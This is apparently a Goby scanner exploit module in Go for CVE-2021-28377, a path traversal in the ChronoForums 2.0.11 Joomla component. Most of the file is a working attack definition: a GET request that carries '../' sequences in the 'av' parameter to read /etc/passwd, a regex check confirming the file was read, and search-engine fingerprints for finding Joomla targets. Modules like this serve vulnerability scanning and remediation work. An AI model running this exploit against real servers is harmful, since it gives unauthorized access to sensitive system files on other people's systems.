package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "ChronoForums 2.0.11 u1 Api Directory Traversal Vulnerability (CVE-2021-28377)",
    "Description": "<p>ChronoEngine ChronoForms is an easy-to-use and flexible form builder for Joomla by ChronoEngine.</p><p>A path traversal vulnerability exists in ChronoEngine ChronoForms that arises from the product's failure to properly filter special elements in resource or file paths. An attacker could exploit this vulnerability to gain access to sensitive information outside the restricted directory.</p>",
    "Impact": "<p>ChronoForums 2.0.11 Directory Traversal</p>",
    "Recommendation": "<p>Set up a whitelist through security devices such as firewalls</p><p>Follow the official website for updates: <a href=\"https://www.chronoengine.com/chronoforms\">https://www.chronoengine.com/chronoforms</a></p>",
    "Product": "ChronoEngine",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "ChronoForums 2.0.11 u1 接口路径遍历漏洞（CVE-2021-28377）",
            "Product": "ChronoEngine",
            "Description": "<p>ChronoEngine ChronoForms是ChronoEngine公司的一个易于使用且灵活的 Joomla 表单构建器。<br></p><p>ChronoEngine ChronoForms 中存在路径遍历漏洞，该漏洞源于产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置获取敏感信息。<br></p>",
            "Recommendation": "<p>通过防火墙等安全设备设置白名单</p><p>关注官网更新：<a href=\"https://www.chronoengine.com/chronoforms\">https://www.chronoengine.com/chronoforms</a></p>",
            "Impact": "<p>ChronoEngine ChronoForms 中存在路径遍历漏洞，该漏洞源于产品未能正确地过滤资源或文件路径中的特殊元素。攻击者可利用该漏洞访问受限目录之外的位置获取敏感信息。<br></p>",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "ChronoForums 2.0.11 u1 Api Directory Traversal Vulnerability (CVE-2021-28377)",
            "Product": "ChronoEngine",
            "Description": "<p>ChronoEngine ChronoForms is an easy-to-use and flexible form builder for Joomla by ChronoEngine.<br></p><p>A path traversal vulnerability exists in ChronoEngine ChronoForms that arises from the product's failure to properly filter special elements in resource or file paths. An attacker could exploit this vulnerability to gain access to sensitive information outside the restricted directory.<br></p>",
            "Recommendation": "<p>Set up a whitelist through security devices such as firewalls</p><p>Follow the official website for updates: <a href=\"https://www.chronoengine.com/chronoforms\">https://www.chronoengine.com/chronoforms</a></p>",
            "Impact": "<p>ChronoForums 2.0.11 Directory Traversal</p>",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "body=\"content=\\\"Joomla\" || (body=\"/media/system/js/core.js\" && body=\"/media/system/js/mootools-core.js\")",
    "GobyQuery": "body=\"content=\\\"Joomla\" || (body=\"/media/system/js/core.js\" && body=\"/media/system/js/mootools-core.js\")",
    "Author": "abszse",
    "Homepage": "https://www.chronoengine.com/chronoforms",
    "DisclosureDate": "2022-04-01",
    "References": [
        "https://herolab.usd.de/en/security-advisories/usd-2021-0007/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-28377"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202201-986"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/component/chronoforums2/profiles/avatar/u1?tvout=file&av=../../../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:(x*?):0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/index.php/component/chronoforums2/profiles/avatar/u1?tvout=file&av=../../../../../../../etc/passwd",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:(x*?):0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "../../../../../../../etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10362"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
